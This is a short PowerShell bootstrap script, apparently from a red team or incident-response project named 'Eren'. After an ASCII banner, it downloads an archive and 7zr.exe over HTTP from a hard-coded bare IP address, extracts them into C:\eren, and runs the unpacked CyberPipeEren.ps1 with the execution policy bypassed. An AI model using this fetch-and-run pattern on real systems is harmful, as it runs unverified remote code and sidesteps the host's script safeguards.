Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ █████                        █████             █████                                                       ████ ║
║░░███                        ░░███             ░░███                                                       ░░███ ║
║ ░███████   ██████   ██████  ███████    █████  ███████   ████████   ██████   ████████     ████████   █████  ░███ ║
║ ░███░░███ ███░░███ ███░░███░░░███░    ███░░  ░░░███░   ░░███░░███ ░░░░░███ ░░███░░███   ░░███░░███ ███░░   ░███ ║
║ ░███ ░███░███ ░███░███ ░███  ░███    ░░█████   ░███     ░███ ░░░   ███████  ░███ ░███    ░███ ░███░░█████  ░███ ║
║ ░███ ░███░███ ░███░███ ░███  ░███ ███ ░░░░███  ░███ ███ ░███      ███░░███  ░███ ░███    ░███ ░███ ░░░░███ ░███ ║
║ ████████ ░░██████ ░░██████   ░░█████  ██████   ░░█████  █████    ░░████████ ░███████  ██ ░███████  ██████  █████║
║░░░░░░░░   ░░░░░░   ░░░░░░     ░░░░░  ░░░░░░     ░░░░░  ░░░░░      ░░░░░░░░  ░███░░░  ░░  ░███░░░  ░░░░░░  ░░░░░ ║
║                                                                             ░███         ░███                   ║
║                                                                             █████        █████                  ║
║                                                                            ░░░░░        ░░░░░                   ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
" 

Write-Host -Fore Red "            Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

if (-not (Test-Path "C:\eren")) {
    New-Item -Path "C:\eren" -ItemType Directory -Force
}


Start-BitsTransfer -Source "http://78.129.240.79:8080/Cyber.7z" -Destination "C:\eren\Cyber.7z"
Start-BitsTransfer -Source "http://78.129.240.79:8080/7zr.exe" -Destination "C:\eren\7zr.exe"


Start-Process "C:\eren\7zr.exe" -ArgumentList "x", "C:\eren\Cyber.7z", "-oC:\eren\", "-y" -Wait


if (Test-Path "C:\eren\Cyber\CyberPipeEren.ps1") {
    Unblock-File -Path "C:\eren\Cyber\CyberPipeEren.ps1"
    powershell -ep bypass C:\eren\Cyber\CyberPipeEren.ps1
} else {
    Write-Host "CyberPipeEren.ps1 not found after extraction."
}


Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
